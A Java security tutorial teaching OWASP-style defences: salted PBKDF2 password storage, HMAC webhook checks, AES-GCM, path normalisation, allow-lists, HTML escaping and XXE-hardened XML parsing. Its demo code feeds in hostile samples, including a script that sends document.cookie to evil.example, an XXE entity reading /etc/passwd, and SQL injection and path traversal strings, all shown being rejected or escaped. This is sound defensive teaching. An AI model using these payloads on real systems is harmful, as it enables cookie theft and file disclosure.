## Concept explanation

Security in a Java back-end comes down to a few habits, each tied to the JDK APIs that implement it. Most real breaches come from the categories in the **OWASP Top 10**:
- broken access control;
- injection;
- cryptographic failures;
- insecure design and configuration;
- vulnerable dependencies.

### 1. Treat every input as hostile

| Threat | Java defence |
|---|---|
| **SQL injection** | `PreparedStatement` parameters; allow-list for identifiers (`ORDER BY` columns) (JDBC lesson) |
| **Command injection** | `ProcessBuilder` with an **argument list** (never `sh -c` with user text); reject inputs starting with `-` so they can't become options |
| **Path traversal** (`../../etc/passwd`) | `base.resolve(input).normalize()`, then check `startsWith(base)` |
| **XSS** (HTML injection) | **encode output** for its context (HTML, attribute, JS, URL): templating engines like Thymeleaf escape by default |
| **XXE** (XML external entities) | disable DOCTYPEs/external entities on `DocumentBuilderFactory`, `SAXParserFactory`, `XMLInputFactory` |
| **Insecure deserialization** | never deserialise untrusted bytes with `ObjectInputStream`; use JSON with explicit types, `ObjectInputFilter` (Serialization lesson) |
| **Log injection / Log4Shell** | escape or encode user data in logs; keep libraries patched (Logging lesson) |

**Validate with allow-lists** (what's allowed), not deny-lists (what's forbidden). Validate at the boundary and encode at output.

### 2. Use cryptography correctly (and don't invent it)

| Goal | Right tool | Wrong tool |
|---|---|---|
| Store passwords | **slow, salted** hash: **Argon2id**, **bcrypt**, scrypt, or **PBKDF2-HMAC-SHA256** (600,000 iterations, OWASP 2023) | SHA-256/MD5 (far too fast), encryption (reversible) |
| Integrity/authenticity of a message (webhooks, tokens) | **HMAC-SHA256** with a secret key; verify with a **constant-time** comparison | plain hash (anyone can recompute it) |
| Confidentiality | **AES-GCM** (authenticated encryption) with a random 96-bit IV, **never reused** with the same key | ECB mode, unauthenticated CBC, home-made XOR |
| Random tokens, salts, keys, IVs | **`SecureRandom`** | `Random`/`Math.random()` (predictable) |
| Comparing secrets | `MessageDigest.isEqual` (constant time) | `Arrays.equals`/`String.equals` (leaks timing) |
| Transport | **TLS 1.2/1.3** (`HttpClient` verifies certificates by default) | trust-all `TrustManager`s, disabled hostname verification |

### 3. Configuration and dependencies

- **Secrets** belong in environment variables, a vault (HashiCorp Vault, AWS Secrets Manager) or a keystore, never in source code, Git, logs or exception messages. Hold passwords in `char[]` and clear them after use, where an API allows it.
- **Dependencies**: most Java CVEs come from libraries (Log4Shell, Spring4Shell, Jackson deserialization gadgets, Commons Collections). Scan them with OWASP Dependency-Check, Snyk or GitHub Dependabot, and upgrade regularly.
- **The Security Manager is gone**: deprecated in Java 17 (JEP 411) and permanently disabled in Java 24 (JEP 486). Sandbox with containers, OS permissions and least-privilege service accounts instead.
- **Access control**:
  - check **authorisation on every request**, on the server: IDOR (insecure direct object reference) is changing `/orders/41` to `/orders/42` and getting someone else's order;
  - deny by default;
  - use the framework (Spring Security) rather than hand-written filters.

## Internal working

- **JCA (Java Cryptography Architecture)**: `MessageDigest.getInstance("SHA-256")`, `Cipher.getInstance("AES/GCM/NoPadding")`, `Mac`, `Signature`, `KeyGenerator` and `SecretKeyFactory` are **engine classes**. They look up an implementation from registered **providers** (SunJCE, SunEC, SunPKCS11, or Bouncy Castle if added). Algorithm names are strings, so typos fail at run time with `NoSuchAlgorithmException`.
- **`SecureRandom`**: the default (`NativePRNG` on Linux, `DRBG` or `Windows-PRNG` elsewhere) is seeded from the OS entropy source. `SecureRandom.getInstanceStrong()` may **block** on Linux (`/dev/random`), so for tokens the default constructor is right.
- **Password hashing**:
  - PBKDF2 applies HMAC thousands of times, so each guess costs as much for an attacker as for you;
  - the **salt** (random per user, stored next to the hash) makes identical passwords hash differently and defeats precomputed rainbow tables;
  - bcrypt and Argon2 are also memory-hard (Argon2) or tunable, and libraries such as Spring Security's `PasswordEncoder` store the algorithm and parameters inside the hash string so you can upgrade later.
- **AES-GCM**:
  - it's counter mode (encrypting a keystream) plus a GHASH authentication tag (128 bits) computed over the ciphertext and **additional authenticated data (AAD)**;
  - decryption verifies the tag **before** returning plaintext and throws `AEADBadTagException` on any modification;
  - **reusing an IV with the same key is catastrophic**: it leaks the XOR of the two plaintexts and allows tag forgery.
- **Constant-time comparison**: `Arrays.equals` returns at the first differing byte. Measuring response times can then reveal, byte by byte, how much of a guessed signature was correct. `MessageDigest.isEqual` compares every byte regardless.
- **TLS in the JDK**: JSSE (`SSLContext`) uses the default trust store `$JAVA_HOME/lib/security/cacerts`, enables TLS 1.3, and verifies hostnames in `HttpClient`. Algorithm policies are in `java.security` (`jdk.tls.disabledAlgorithms` disables SSLv3, RC4, etc.).

## Visual representation

```text title="Storing and checking a password"
 register("correct horse")
     salt = SecureRandom 16 bytes
     hash = PBKDF2-HMAC-SHA256(password, salt, 600000 iterations, 256 bits)
     store "pbkdf2-sha256$600000$<salt b64>$<hash b64>"     (never the password)

 login("correct horse")
     parse iterations + salt from the stored string
     recompute PBKDF2 -> compare with MessageDigest.isEqual (constant time) -> true

 AES-GCM:  key + random IV(12 bytes) + plaintext + AAD("order-42")
        -> ciphertext (same length) + tag (16 bytes)
     decrypt with changed byte / wrong AAD -> AEADBadTagException (nothing returned)
```

## Java code example

```java title="CryptoDemo.java" file="CryptoDemo.java"
import java.nio.charset.StandardCharsets;
import java.security.GeneralSecurityException;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.Base64;
import java.util.HexFormat;
import javax.crypto.AEADBadTagException;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.Mac;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class CryptoDemo {
    static final SecureRandom RANDOM = new SecureRandom();
    static final int ITERATIONS = 600_000;                     // OWASP 2023 guidance for PBKDF2-HMAC-SHA256
    static final Base64.Encoder B64 = Base64.getEncoder().withoutPadding();

    // ---- passwords
    static byte[] pbkdf2(char[] password, byte[] salt, int iterations) throws GeneralSecurityException {
        PBEKeySpec spec = new PBEKeySpec(password, salt, iterations, 256);
        try {
            return SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256").generateSecret(spec).getEncoded();
        } finally {
            spec.clearPassword();
        }
    }

    static String hashPassword(char[] password) throws GeneralSecurityException {
        byte[] salt = new byte[16];
        RANDOM.nextBytes(salt);
        byte[] hash = pbkdf2(password, salt, ITERATIONS);
        return "pbkdf2-sha256$" + ITERATIONS + "$" + B64.encodeToString(salt) + "$" + B64.encodeToString(hash);
    }

    static boolean verifyPassword(char[] attempt, String stored) throws GeneralSecurityException {
        String[] parts = stored.split("\\$");
        byte[] salt = Base64.getDecoder().decode(parts[2]);
        byte[] expected = Base64.getDecoder().decode(parts[3]);
        byte[] actual = pbkdf2(attempt, salt, Integer.parseInt(parts[1]));
        return MessageDigest.isEqual(expected, actual);       // constant-time comparison
    }

    // ---- AES-GCM
    static byte[] encrypt(SecretKey key, byte[] iv, byte[] plaintext, byte[] aad) throws GeneralSecurityException {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
        cipher.updateAAD(aad);
        return cipher.doFinal(plaintext);
    }

    static String decrypt(SecretKey key, byte[] iv, byte[] ciphertext, byte[] aad) throws GeneralSecurityException {
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, iv));
        cipher.updateAAD(aad);
        try {
            return new String(cipher.doFinal(ciphertext), StandardCharsets.UTF_8);
        } catch (AEADBadTagException e) {
            return "AEADBadTagException (tampered or wrong key/AAD)";
        }
    }

    public static void main(String[] args) throws GeneralSecurityException {
        HexFormat hex = HexFormat.of();

        // 1. Plain hashes are deterministic and fast: fine for checksums, wrong for passwords
        byte[] sha = MessageDigest.getInstance("SHA-256").digest("hello".getBytes(StandardCharsets.UTF_8));
        System.out.println("SHA-256(hello) = " + hex.formatHex(sha));

        // 2. Password storage
        char[] password = "correct horse battery staple".toCharArray();
        String stored = hashPassword(password);
        String storedAgain = hashPassword(password);
        String[] parts = stored.split("\\$");
        System.out.println("stored format: " + parts[0] + "$" + parts[1] + "$<salt " + parts[2].length()
                + " chars>$<hash " + parts[3].length() + " chars>");
        System.out.println("same password, different salt -> different stored values: " + !stored.equals(storedAgain));
        System.out.println("verify correct password: " + verifyPassword("correct horse battery staple".toCharArray(), stored));
        System.out.println("verify wrong password:   " + verifyPassword("correct horse battery stapler".toCharArray(), stored));
        Arrays.fill(password, '\0');                           // clear the secret from memory

        // 3. Random tokens
        byte[] tokenBytes = new byte[32];
        RANDOM.nextBytes(tokenBytes);
        String token = Base64.getUrlEncoder().withoutPadding().encodeToString(tokenBytes);
        System.out.println("session token: " + token.length() + " URL-safe chars, 256 random bits, matches pattern "
                + token.matches("[A-Za-z0-9_-]{43}"));

        // 4. HMAC: verify that a webhook really came from the provider
        byte[] secret = "whsec_demo_shared_secret".getBytes(StandardCharsets.UTF_8);
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(secret, "HmacSHA256"));
        String body = "{\"order\":42,\"status\":\"paid\"}";
        byte[] signature = mac.doFinal(body.getBytes(StandardCharsets.UTF_8));
        System.out.println("HMAC-SHA256 signature header: " + hex.formatHex(signature));
        String forged = "{\"order\":42,\"status\":\"refunded\"}";
        byte[] forgedCheck = mac.doFinal(forged.getBytes(StandardCharsets.UTF_8));
        System.out.println("genuine body verifies: " + MessageDigest.isEqual(signature, mac.doFinal(body.getBytes(StandardCharsets.UTF_8)))
                + ", altered body with the old signature verifies: " + MessageDigest.isEqual(signature, forgedCheck));

        // 5. Authenticated encryption with AES-GCM
        KeyGenerator generator = KeyGenerator.getInstance("AES");
        generator.init(256);
        SecretKey key = generator.generateKey();
        byte[] iv = new byte[12];
        RANDOM.nextBytes(iv);                                  // fresh IV for every message
        byte[] aad = "order-42".getBytes(StandardCharsets.UTF_8);
        byte[] plaintext = "card=4242424242424242;exp=12/30".getBytes(StandardCharsets.UTF_8);
        byte[] ciphertext = encrypt(key, iv, plaintext, aad);
        System.out.println("plaintext " + plaintext.length + " bytes -> ciphertext " + ciphertext.length + " bytes (+16-byte tag)");
        System.out.println("decrypt: " + decrypt(key, iv, ciphertext, aad));
        byte[] tampered = ciphertext.clone();
        tampered[5] ^= 1;
        System.out.println("decrypt tampered: " + decrypt(key, iv, tampered, aad));
        System.out.println("decrypt with AAD order-43: " + decrypt(key, iv, ciphertext, "order-43".getBytes(StandardCharsets.UTF_8)));

        // 6. Why ECB is broken: equal plaintext blocks give equal ciphertext blocks
        Cipher ecb = Cipher.getInstance("AES/ECB/PKCS5Padding");
        ecb.init(Cipher.ENCRYPT_MODE, key);
        byte[] blocks = ecb.doFinal("SAME 16 BYTES!!!SAME 16 BYTES!!!".getBytes(StandardCharsets.US_ASCII));
        System.out.println("ECB: identical plaintext blocks produce identical ciphertext blocks: "
                + Arrays.equals(blocks, 0, 16, blocks, 16, 32));
    }
}
```

```java title="InputSafetyDemo.java" file="InputSafetyDemo.java"
import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.List;
import java.util.Set;
import java.util.regex.Pattern;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.xml.sax.ErrorHandler;
import org.xml.sax.SAXException;
import org.xml.sax.SAXParseException;

public class InputSafetyDemo {
    // ---- path traversal
    static final Path UPLOADS = Path.of("uploads").toAbsolutePath().normalize();

    static Path safeResolve(String userPath) {
        Path resolved = UPLOADS.resolve(userPath).normalize();
        if (!resolved.startsWith(UPLOADS)) {
            throw new SecurityException("path escapes the upload directory");
        }
        return resolved;
    }

    // ---- allow-list validation
    static final Pattern USERNAME = Pattern.compile("[a-z0-9_]{3,20}");
    static final Set<String> SORT_COLUMNS = Set.of("name", "price", "created_at");

    static String orderBy(String column) {
        if (!SORT_COLUMNS.contains(column)) {
            throw new IllegalArgumentException("unsupported sort column");
        }
        return "SELECT id, name, price FROM product ORDER BY " + column;   // safe: value is from the allow-list
    }

    // ---- output encoding for HTML element content and attributes
    static String escapeHtml(String s) {
        StringBuilder out = new StringBuilder(s.length() + 16);
        for (char c : s.toCharArray()) {
            switch (c) {
                case '<' -> out.append("&lt;");
                case '>' -> out.append("&gt;");
                case '&' -> out.append("&amp;");
                case '"' -> out.append("&quot;");
                case '\'' -> out.append("&#x27;");
                default -> out.append(c);
            }
        }
        return out.toString();
    }

    // ---- XML parsing with external entities disabled
    static DocumentBuilder secureXmlParser() throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);
        DocumentBuilder builder = factory.newDocumentBuilder();
        builder.setErrorHandler(new ErrorHandler() {          // report via exceptions, not stderr
            @Override public void warning(SAXParseException e) { }
            @Override public void error(SAXParseException e) throws SAXException { throw e; }
            @Override public void fatalError(SAXParseException e) throws SAXException { throw e; }
        });
        return builder;
    }

    public static void main(String[] args) throws Exception {
        for (String input : List.of("report.pdf", "invoices/2024/march.pdf", "invoices/../report.pdf", "../secrets.env", "invoices/../../app/config.yml")) {
            try {
                Path p = safeResolve(input);
                System.out.println("path " + input + " -> allowed: uploads/" + UPLOADS.relativize(p).toString().replace('\\', '/'));
            } catch (SecurityException e) {
                System.out.println("path " + input + " -> REJECTED: " + e.getMessage());
            }
        }

        for (String name : List.of("ada_99", "Robert'); DROP TABLE users;--", "x")) {
            System.out.println("username '" + name + "' valid: " + USERNAME.matcher(name).matches());
        }
        System.out.println(orderBy("price"));
        try {
            orderBy("price; DELETE FROM product");
        } catch (IllegalArgumentException e) {
            System.out.println("sort column rejected: " + e.getMessage());
        }

        String comment = "<script>fetch('https://evil.example/?c='+document.cookie)</script>";
        System.out.println("HTML-escaped comment: " + escapeHtml(comment));

        DocumentBuilder xml = secureXmlParser();
        String order = "<order id=\"42\"><item>book</item></order>";
        System.out.println("normal XML parsed, root element: "
                + xml.parse(new ByteArrayInputStream(order.getBytes(StandardCharsets.UTF_8))).getDocumentElement().getTagName());
        String xxe = "<?xml version=\"1.0\"?><!DOCTYPE order [<!ENTITY secret SYSTEM \"file:///etc/passwd\">]><order>&secret;</order>";
        try {
            xml.parse(new ByteArrayInputStream(xxe.getBytes(StandardCharsets.UTF_8)));
        } catch (SAXParseException e) {
            System.out.println("XXE payload rejected: " + e.getMessage());
        }

        System.out.println("command arguments as a list, no shell: " + new ProcessBuilder("git", "log", "--", "user-supplied-path").command());
    }
}
```

## Output

```text title="Output" output="CryptoDemo.java"
SHA-256(hello) = 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
stored format: pbkdf2-sha256$600000$<salt 22 chars>$<hash 43 chars>
same password, different salt -> different stored values: true
verify correct password: true
verify wrong password:   false
session token: 43 URL-safe chars, 256 random bits, matches pattern true
HMAC-SHA256 signature header: e133749aa8d5d73462aac95251cb7cf5bd7506833289c38ba744d8518b082c08
genuine body verifies: true, altered body with the old signature verifies: false
plaintext 31 bytes -> ciphertext 47 bytes (+16-byte tag)
decrypt: card=4242424242424242;exp=12/30
decrypt tampered: AEADBadTagException (tampered or wrong key/AAD)
decrypt with AAD order-43: AEADBadTagException (tampered or wrong key/AAD)
ECB: identical plaintext blocks produce identical ciphertext blocks: true
```

```text title="Output" output="InputSafetyDemo.java"
path report.pdf -> allowed: uploads/report.pdf
path invoices/2024/march.pdf -> allowed: uploads/invoices/2024/march.pdf
path invoices/../report.pdf -> allowed: uploads/report.pdf
path ../secrets.env -> REJECTED: path escapes the upload directory
path invoices/../../app/config.yml -> REJECTED: path escapes the upload directory
username 'ada_99' valid: true
username 'Robert'); DROP TABLE users;--' valid: false
username 'x' valid: false
SELECT id, name, price FROM product ORDER BY price
sort column rejected: unsupported sort column
HTML-escaped comment: &lt;script&gt;fetch(&#x27;https://evil.example/?c=&#x27;+document.cookie)&lt;/script&gt;
normal XML parsed, root element: order
XXE payload rejected: DOCTYPE is disallowed when the feature "http://apache.org/xml/features/disallow-doctype-decl" set to true.
command arguments as a list, no shell: [git, log, --, user-supplied-path]
```

**Crypto** (no random value is printed, so the output is stable):
- **SHA-256** is deterministic and fast, which is perfect for checksums and exactly why it's wrong for passwords: attackers compute billions per second.
- **PBKDF2 with a random salt** stored the same password differently twice, and verification recomputed the hash with the stored salt and iteration count.
- **The token** has 256 bits from `SecureRandom`, URL-safe.
- **HMAC** proved the webhook body came from the holder of the secret: changing `paid` to `refunded` broke the signature.
- **AES-GCM** produced ciphertext plus a 16-byte tag, and any modified byte or different AAD made decryption **fail** instead of returning garbage.
- **ECB** leaked the plaintext's structure: equal input blocks gave equal output blocks (the famous "ECB penguin").

**Input handling**:
- `normalize()` plus `startsWith` allowed `invoices/../report.pdf` (it stays inside) and rejected both escapes.
- The allow-lists rejected a crafted username and an injected `ORDER BY` value.
- HTML escaping turned the script into inert text.
- The hardened XML parser refused the DOCTYPE carrying an external entity.
- `ProcessBuilder` passes arguments directly to the program, with no shell to interpret `;` or `&&`. The `--` stops a user value from being read as a `git` option.

## Real-world application

- **Spring Security**:
  - `PasswordEncoder` (`BCryptPasswordEncoder`, `Argon2PasswordEncoder`, `DelegatingPasswordEncoder` with `{bcrypt}` prefixes for upgrades);
  - CSRF protection, CORS configuration, security headers;
  - method security (`@PreAuthorize`);
  - OAuth2/OIDC resource servers validating **JWTs**: signatures verified with RS256/ES256 public keys, plus `exp`, `aud` and `iss` checks.
- **Webhooks**: Stripe, GitHub and Shopify sign payloads with HMAC-SHA256. Verify the signature over the **raw body** with a constant-time compare, and check the timestamp to prevent replays.
- **Encrypting data at rest**: application-level AES-GCM for especially sensitive fields (PII, tokens), with keys managed by a KMS (envelope encryption: data keys encrypted by a master key) and rotated.
- **Secure defaults**:
  - HTTPS everywhere, with HSTS;
  - security headers (Content-Security-Policy);
  - parameterised queries;
  - auto-escaping templates;
  - JSON instead of Java serialization;
  - least-privilege database users;
  - dependency scanning in CI;
  - secrets in vaults with rotation.
- **Audits and pentests** check exactly these items: injection, authentication and session handling, access control (IDOR), crypto misuse, XXE, deserialization, outdated libraries.

## Common mistakes

- **Hashing passwords with SHA-256/MD5** (even salted) or encrypting them. Use bcrypt, Argon2id or PBKDF2 with a high work factor.
- **`new Random()` for tokens, OTPs or reset links**: it's predictable. Use `SecureRandom`.
- **Comparing signatures or tokens with `equals`**: timing leaks. Use `MessageDigest.isEqual`.
- **`Cipher.getInstance("AES")`**: it defaults to **ECB** with PKCS5 padding. Always name the mode: `AES/GCM/NoPadding`.
- **Reusing a GCM IV** with the same key, or hard-coding keys and IVs in source code.
- **Trust-all certificate managers** "temporarily" disabling TLS verification. They end up in production.
- **Deny-list validation** (stripping `<script>`): attackers find variants. Use allow-lists plus contextual output encoding.
- **Default XML parser settings** on untrusted XML (XXE, billion laughs), and **Java deserialization of untrusted data**.
- **Secrets in Git, logs or exception messages**, and verbose error pages that leak stack traces to users.
- **Authorisation checks only in the UI**: every API endpoint must check that the caller may access *this* resource.

## Interview questions

**Q1. How should passwords be stored?**

````reveal title="Answer"
Never in plain text or with reversible encryption, and not with fast hashes. Use a **slow, salted, adaptive** password-hashing function: **Argon2id**, **bcrypt** (cost ≥ 10-12), scrypt, or **PBKDF2-HMAC-SHA256** with ~600,000 iterations. Store the algorithm, parameters, salt and hash together (for example `$2b$12$…`), so the work factor can be raised and hashes upgraded on the next login. Compare in constant time, and add rate limiting, lockouts and breached-password checks.
````

**Q2. Hashing vs encryption vs HMAC?**

````reveal title="Answer"
- **Hashing** (SHA-256) is a one-way, keyless fingerprint: used for integrity checks and deduplication, and in slow, salted form for passwords.
- **Encryption** (AES-GCM, RSA) is reversible with a key and gives confidentiality. Authenticated modes such as GCM also detect tampering.
- **An HMAC** is a keyed hash: only holders of the secret can compute or verify it, so it proves integrity **and** authenticity of a message (webhooks, API signatures, JWT HS256) but hides nothing.
- **Digital signatures** (RSA/ECDSA) do the same with public/private key pairs, so anyone can verify but only the key owner can sign.
````

**Q3. Why `SecureRandom` instead of `Random`?**

````reveal title="Answer"
`java.util.Random` is a 48-bit linear congruential generator: after seeing a couple of outputs, an attacker can compute its state and predict every future value (session IDs, reset tokens, OTPs). `SecureRandom` is a cryptographically strong generator seeded from OS entropy, so its outputs are unpredictable. Use it for tokens, salts, keys and IVs. Avoid `getInstanceStrong()` in request paths, because it can block on some systems.
````

**Q4. What is XXE, and how do you prevent it in Java?**

````reveal title="Answer"
XML External Entity injection: a DOCTYPE declares an entity pointing to a file or URL (`<!ENTITY x SYSTEM "file:///etc/passwd">`). A parser that resolves it leaks local files, performs SSRF to internal URLs, or can be hit with denial of service (the "billion laughs" entity expansion). Java's default parsers historically allowed DOCTYPEs. Prevent it by:
- disallowing DOCTYPE declarations (the `disallow-doctype-decl` feature), or disabling external general and parameter entities and external DTD loading;
- setting `XMLConstants.FEATURE_SECURE_PROCESSING`;
- configuring every factory you use (DOM, SAX, StAX, `TransformerFactory`).
````

**Q5. Why compare secrets in constant time?**

````reveal title="Answer"
`String.equals`/`Arrays.equals` stop at the first mismatching byte, so a comparison with a correct prefix takes slightly longer. Over many requests, an attacker can measure that difference and recover a signature or token byte by byte (a timing attack). `MessageDigest.isEqual` (constant time since Java 6u17) always examines every byte, so its duration doesn't depend on where the inputs differ. Use it for HMACs, API keys and reset tokens.
````

## Hands-on exercise

Implement **signed, expiring tokens** (a simplified JWT with HS256):
- `issue(String user, Duration ttl)` returns `base64url(payload) + "." + base64url(HMAC-SHA256(payload))`, where `payload = "sub=<user>;exp=<epoch seconds>"`;
- `verify(String token)` returns the user, or throws `SecurityException` with `"malformed"`, `"bad signature"` (constant-time compare) or `"expired"`;
- use an injected **`Clock`** for testable expiry, and a fixed demo key so the output is reproducible.

Show:
1. a valid token;
2. a token whose payload was changed to `sub=admin`;
3. an expired token (advance the clock);
4. garbage input.

````hint title="Hint"
Split on `"\\."` and expect exactly two parts. Recompute the HMAC over the decoded payload bytes and compare with `MessageDigest.isEqual`. **Check the signature before trusting anything in the payload** (including `exp`). Use `Clock.fixed(Instant.parse(...), ZoneOffset.UTC)` and `Clock.offset(clock, Duration.ofMinutes(16))` to move time.
````

````solution title="Solution"
```java title="SignedTokens.java" file="SignedTokens.java"
import java.nio.charset.StandardCharsets;
import java.security.GeneralSecurityException;
import java.security.MessageDigest;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.time.ZoneOffset;
import java.util.Base64;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;

public class SignedTokens {
    private final byte[] key;
    private final Clock clock;

    SignedTokens(byte[] key, Clock clock) {
        this.key = key.clone();
        this.clock = clock;
    }

    private byte[] hmac(byte[] data) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(key, "HmacSHA256"));
            return mac.doFinal(data);
        } catch (GeneralSecurityException e) {
            throw new IllegalStateException(e);
        }
    }

    String issue(String user, Duration ttl) {
        long exp = clock.instant().plus(ttl).getEpochSecond();
        byte[] payload = ("sub=" + user + ";exp=" + exp).getBytes(StandardCharsets.UTF_8);
        Base64.Encoder enc = Base64.getUrlEncoder().withoutPadding();
        return enc.encodeToString(payload) + "." + enc.encodeToString(hmac(payload));
    }

    String verify(String token) {
        String[] parts = token.split("\\.");
        byte[] payload;
        byte[] signature;
        try {
            if (parts.length != 2) {
                throw new IllegalArgumentException();
            }
            payload = Base64.getUrlDecoder().decode(parts[0]);
            signature = Base64.getUrlDecoder().decode(parts[1]);
        } catch (IllegalArgumentException e) {
            throw new SecurityException("malformed");
        }
        if (!MessageDigest.isEqual(hmac(payload), signature)) {          // authenticate first
            throw new SecurityException("bad signature");
        }
        String[] fields = new String(payload, StandardCharsets.UTF_8).split(";");
        String user = fields[0].substring("sub=".length());
        long exp = Long.parseLong(fields[1].substring("exp=".length()));
        if (clock.instant().getEpochSecond() >= exp) {
            throw new SecurityException("expired");
        }
        return user;
    }

    static void check(String label, SignedTokens tokens, String token) {
        try {
            System.out.println(label + ": valid for user " + tokens.verify(token));
        } catch (SecurityException e) {
            System.out.println(label + ": rejected (" + e.getMessage() + ")");
        }
    }

    public static void main(String[] args) {
        byte[] demoKey = "demo-key-use-32-random-bytes-in-prod".getBytes(StandardCharsets.UTF_8);
        Clock now = Clock.fixed(Instant.parse("2025-03-01T10:00:00Z"), ZoneOffset.UTC);
        SignedTokens tokens = new SignedTokens(demoKey, now);

        String token = tokens.issue("ada", Duration.ofMinutes(15));
        System.out.println("token: " + token);
        check("original", tokens, token);

        String forgedPayload = Base64.getUrlEncoder().withoutPadding()
                .encodeToString("sub=admin;exp=9999999999".getBytes(StandardCharsets.UTF_8));
        check("payload changed to admin", tokens, forgedPayload + token.substring(token.indexOf('.')));

        SignedTokens later = new SignedTokens(demoKey, Clock.offset(now, Duration.ofMinutes(16)));
        check("16 minutes later", later, token);

        check("garbage", tokens, "not-a-token");
    }
}
```

```text title="Output" output="SignedTokens.java"
token: c3ViPWFkYTtleHA9MTc0MDgyNDEwMA.t9y2MowNLwrIXhK11NLMmHCeQ9bhp2I06LkxR_GNBDI
original: valid for user ada
payload changed to admin: rejected (bad signature)
16 minutes later: rejected (expired)
garbage: rejected (malformed)
```

The attacker could change the payload, but without the key they couldn't produce a matching signature. That's why the signature is verified **before** any field (even `exp`) is trusted. Real JWTs add a header naming the algorithm. Libraries must reject `alg: none` and pin the expected algorithm; ignoring that has caused real vulnerabilities. Payloads are only encoded, not encrypted, so never put secrets in them.
````

## Knowledge check

```quiz
? Which is appropriate for storing user passwords?
+ bcrypt, Argon2id or PBKDF2 with a per-user salt and a high work factor
- SHA-256 with a global salt
- AES encryption with a key in the config file
> Password hashes must be slow and salted.

? What does Cipher.getInstance("AES") give you in the JDK?
+ AES in ECB mode with PKCS5 padding, which is insecure
- AES-GCM
- AES-CBC with a random IV
> Always specify the mode, for example AES/GCM/NoPadding.

? Why use MessageDigest.isEqual to compare HMAC signatures?
+ It runs in constant time, preventing timing attacks
- It's faster than Arrays.equals
- It decodes Base64 automatically
> Early-exit comparisons leak how many bytes matched.

? How do you prevent path traversal for a user-supplied file name?
+ Resolve against the base directory, normalize, and check startsWith(base)
- Remove every occurrence of "../" from the input
- URL-encode the file name
> Deny-list stripping is bypassable; check the final normalized path.

? What does decrypting a modified AES-GCM ciphertext produce?
+ AEADBadTagException, with no plaintext returned
- Garbled plaintext
- The original plaintext
> GCM authenticates the ciphertext and AAD.
```

## Key takeaways

- **Inputs are hostile**: parameterised SQL, argument-list processes, normalised paths with a `startsWith` check, allow-list validation, and contextual output encoding (XSS). Harden XML parsers and avoid deserialising untrusted data.
- **Passwords**: bcrypt, Argon2id or PBKDF2 with salt and a high work factor. **Tokens**: `SecureRandom`. **Integrity**: HMAC with constant-time verification. **Confidentiality**: AES-GCM with unique IVs, never ECB.
- Use the **JCA** correctly, name algorithms and modes explicitly, keep TLS verification on, and never roll your own crypto.
- **Secrets** go in vaults or the environment, not code or logs. **Dependencies** are the biggest attack surface: scan and patch them.
- Authorise **every request on the server**, deny by default, and rely on proven frameworks (Spring Security).
